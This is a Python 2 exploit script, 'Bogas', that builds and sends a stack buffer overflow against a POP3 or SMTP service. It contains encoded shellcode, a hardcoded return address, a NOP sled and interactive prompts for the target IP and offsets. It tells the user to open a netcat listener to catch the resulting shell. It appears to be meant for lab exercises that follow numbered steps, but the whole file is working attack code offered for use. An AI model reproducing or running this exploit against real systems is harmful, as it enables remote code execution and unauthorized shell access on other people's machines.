#!/usr/bin/python2.7
null    = """
written by coolhandsquid
Bogas
Buffer Overflow Generater Automatic Semi
"""

import socket
import os

shellcode	= (
"\x89\xe0\xdb\xc4\xd9\x70\xf4\x5b\x53\x59\x49\x49\x49\x49\x43"
"\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34"
"\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41"
"\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58"
"\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a\x48\x4d\x52\x33\x30"
"\x33\x30\x35\x50\x45\x30\x4d\x59\x4b\x55\x36\x51\x49\x50\x52"
"\x44\x4c\x4b\x56\x30\x30\x30\x4c\x4b\x50\x52\x54\x4c\x4c\x4b"
"\x31\x42\x34\x54\x4c\x4b\x44\x32\x51\x38\x44\x4f\x48\x37\x51"
"\x5a\x46\x46\x46\x51\x4b\x4f\x4e\x4c\x37\x4c\x33\x51\x53\x4c"
"\x44\x42\x46\x4c\x51\x30\x59\x51\x38\x4f\x44\x4d\x55\x51\x4f"
"\x37\x5a\x42\x4b\x42\x31\x42\x50\x57\x4c\x4b\x46\x32\x44\x50"
"\x4c\x4b\x31\x5a\x57\x4c\x4c\x4b\x50\x4c\x34\x51\x53\x48\x4b"
"\x53\x47\x38\x53\x31\x4e\x31\x46\x31\x4c\x4b\x46\x39\x37\x50"
"\x43\x31\x48\x53\x4c\x4b\x47\x39\x44\x58\x4b\x53\x56\x5a\x50"
"\x49\x4c\x4b\x56\x54\x4c\x4b\x33\x31\x4e\x36\x36\x51\x4b\x4f"
"\x4e\x4c\x4f\x31\x38\x4f\x34\x4d\x53\x31\x4f\x37\x37\x48\x4d"
"\x30\x34\x35\x5a\x56\x35\x53\x43\x4d\x4a\x58\x37\x4b\x33\x4d"
"\x36\x44\x33\x45\x4b\x54\x56\x38\x4c\x4b\x51\x48\x56\x44\x33"
"\x31\x48\x53\x42\x46\x4c\x4b\x44\x4c\x50\x4b\x4c\x4b\x51\x48"
"\x35\x4c\x55\x51\x4e\x33\x4c\x4b\x53\x34\x4c\x4b\x43\x31\x58"
"\x50\x4c\x49\x30\x44\x37\x54\x56\x44\x31\x4b\x51\x4b\x45\x31"
"\x36\x39\x31\x4a\x30\x51\x4b\x4f\x4b\x50\x31\x4f\x51\x4f\x31"
"\x4a\x4c\x4b\x55\x42\x4a\x4b\x4c\x4d\x51\x4d\x45\x38\x47\x43"
"\x57\x42\x35\x50\x43\x30\x43\x58\x33\x47\x34\x33\x57\x42\x51"
"\x4f\x50\x54\x33\x58\x30\x4c\x42\x57\x46\x46\x44\x47\x4b\x4f"
"\x48\x55\x48\x38\x5a\x30\x43\x31\x43\x30\x45\x50\x46\x49\x39"
"\x54\x46\x34\x36\x30\x35\x38\x51\x39\x4b\x30\x52\x4b\x43\x30"
"\x4b\x4f\x4e\x35\x46\x30\x46\x30\x36\x30\x30\x50\x51\x50\x36"
"\x30\x47\x30\x56\x30\x43\x58\x4b\x5a\x54\x4f\x39\x4f\x4d\x30"
"\x4b\x4f\x49\x45\x4a\x37\x32\x4a\x54\x45\x43\x58\x49\x50\x59"
"\x38\x4f\x4e\x4d\x57\x33\x58\x34\x42\x55\x50\x55\x4b\x50\x39"
"\x4b\x39\x4d\x36\x52\x4a\x44\x50\x31\x46\x50\x57\x35\x38\x4a"
"\x39\x59\x35\x42\x54\x35\x31\x4b\x4f\x59\x45\x4c\x45\x4f\x30"
"\x54\x34\x44\x4c\x4b\x4f\x50\x4e\x54\x48\x34\x35\x5a\x4c\x33"
"\x58\x4c\x30\x58\x35\x39\x32\x51\x46\x4b\x4f\x58\x55\x32\x48"
"\x33\x53\x42\x4d\x42\x44\x53\x30\x4d\x59\x4b\x53\x50\x57\x56"
"\x37\x36\x37\x30\x31\x4a\x56\x42\x4a\x44\x52\x36\x39\x31\x46"
"\x4d\x32\x4b\x4d\x55\x36\x58\x47\x31\x54\x36\x44\x37\x4c\x45"
"\x51\x45\x51\x4c\x4d\x50\x44\x57\x54\x44\x50\x48\x46\x55\x50"
"\x31\x54\x30\x54\x46\x30\x30\x56\x56\x36\x30\x56\x37\x36\x36"
"\x36\x50\x4e\x51\x46\x50\x56\x50\x53\x46\x36\x45\x38\x54\x39"
"\x48\x4c\x47\x4f\x4d\x56\x4b\x4f\x39\x45\x4c\x49\x4d\x30\x50"
"\x4e\x56\x36\x31\x56\x4b\x4f\x56\x50\x53\x58\x43\x38\x4c\x47"
"\x45\x4d\x55\x30\x4b\x4f\x39\x45\x4f\x4b\x5a\x50\x58\x35\x4e"
"\x42\x36\x36\x32\x48\x49\x36\x5a\x35\x4f\x4d\x4d\x4d\x4b\x4f"
"\x58\x55\x47\x4c\x33\x36\x53\x4c\x45\x5a\x4d\x50\x4b\x4b\x4b"
"\x50\x52\x55\x54\x45\x4f\x4b\x31\x57\x35\x43\x44\x32\x32\x4f"
"\x32\x4a\x45\x50\x31\x43\x4b\x4f\x59\x45\x41\x41"
)

template	= ("\xd9\xca\xb8\x6d\xba\xe7\x9d\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x42\x17\x83\xc2\x04\x03\x2f\xa9\x05\x68\x53\x25\x4b"
"\x93\xab\xb6\x2c\x1d\x4e\x87\x6c\x79\x1b\xb8\x5c\x09\x49\x35"
"\x16\x5f\x79\xce\x5a\x48\x8e\x67\xd0\xae\xa1\x78\x49\x92\xa0"
"\xfa\x90\xc7\x02\xc2\x5a\x1a\x43\x03\x86\xd7\x11\xdc\xcc\x4a"
"\x85\x69\x98\x56\x2e\x21\x0c\xdf\xd3\xf2\x2f\xce\x42\x88\x69"
"\xd0\x65\x5d\x02\x59\x7d\x82\x2f\x13\xf6\x70\xdb\xa2\xde\x48"
"\x24\x08\x1f\x65\xd7\x50\x58\x42\x08\x27\x90\xb0\xb5\x30\x67"
"\xca\x61\xb4\x73\x6c\xe1\x6e\x5f\x8c\x26\xe8\x14\x82\x83\x7e"
"\x72\x87\x12\x52\x09\xb3\x9f\x55\xdd\x35\xdb\x71\xf9\x1e\xbf"
"\x18\x58\xfb\x6e\x24\xba\xa4\xcf\x80\xb1\x49\x1b\xb9\x98\x05"
"\xe8\xf0\x22\xd6\x66\x82\x51\xe4\x29\x38\xfd\x44\xa1\xe6\xfa"
"\xab\x98\x5f\x94\x55\x23\xa0\xbd\x91\x77\xf0\xd5\x30\xf8\x9b"
"\x25\xbc\x2d\x0b\x75\x12\x9e\xec\x25\xd2\x4e\x85\x2f\xdd\xb1"
"\xb5\x50\x37\xda\x5c\xab\xd0\xef\xab\xb3\x89\x98\xa9\xb3\xd2"
"\x61\x27\x55\x8e\x81\x61\xce\x27\x3b\x28\x84\xd6\xc4\xe6\xe1"
"\xd9\x4f\x05\x16\x97\xa7\x60\x04\x40\x48\x3f\x76\xc7\x57\x95"
"\x1e\x8b\xca\x72\xde\xc2\xf6\x2c\x89\x83\xc9\x24\x5f\x3e\x73"
"\x9f\x7d\xc3\xe5\xd8\xc5\x18\xd6\xe7\xc4\xed\x62\xcc\xd6\x2b"
"\x6a\x48\x82\xe3\x3d\x06\x7c\x42\x94\xe8\xd6\x1c\x4b\xa3\xbe"
"\xd9\xa7\x74\xb8\xe5\xed\x02\x24\x57\x58\x53\x5b\x58\x0c\x53"
"\x24\x84\xac\x9c\xff\x0c\xdc\xd6\x5d\x24\x75\xbf\x34\x74\x18"
"\x40\xe3\xbb\x25\xc3\x01\x44\xd2\xdb\x60\x41\x9e\x5b\x99\x3b"
"\x8f\x09\x9d\xe8\xb0\x1b")



print "This is the final product we will be sending to the macine!"
print "Make sure you copy the shellcode from the previous step into the shellcode variable."
print "Also nano into this and change the EIP to what you discovered in step 7 (It must be written in little endian)."
print "If you are running this with the attempt to get a shell, open a second ssh session and run without the debugger."
print "Use the syntax nc -lvp 6969 (port number you chose when you made the shellcode)"
ipaddr  = raw_input("What is the ip of the machine you are trying to exploit?\n> ")
portnum = input("What is the port number you are sending traffic over?\n> ")
portnum = int(portnum)
location        = input("What was the crash location (verified in step 4)?\n> ")
location        = int(location)
shellcodelen	= int(input("What is the length of the shellcode (step 9)?\n> "))
shellcodespace	= int(input("What was the overall shell code space (step 5)?\n> "))
service_greeting        = "PASS "
if portnum      == 25:
	service_greeting        = "HELO "
elif portnum    == 110:
	service_greeting        = "PASS "

s       = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

###VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV
EIP	= "\x69\x2d\xb3\x7c"
###^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
###^^^^^ little endian ^^^^^^

buffer  = "A" * location + EIP + "\x90" * 16 + shellcode + "C" * (shellcodespace - 4 - shellcodelen - 16)

try:
	print "\nSending evil buffer..."
	s.connect((ipaddr, portnum))
	data = s.recv(1024)
	a       = "USER username" + "\r\n"
	s.send(a)
	data = s.recv(1024)
	b       = service_greeting + buffer +"\r\n"
	s.send(b)
	print "\nDone! Check your listener, you should now have a shellcode!"
except:
	print "Could not connect to POP3!"

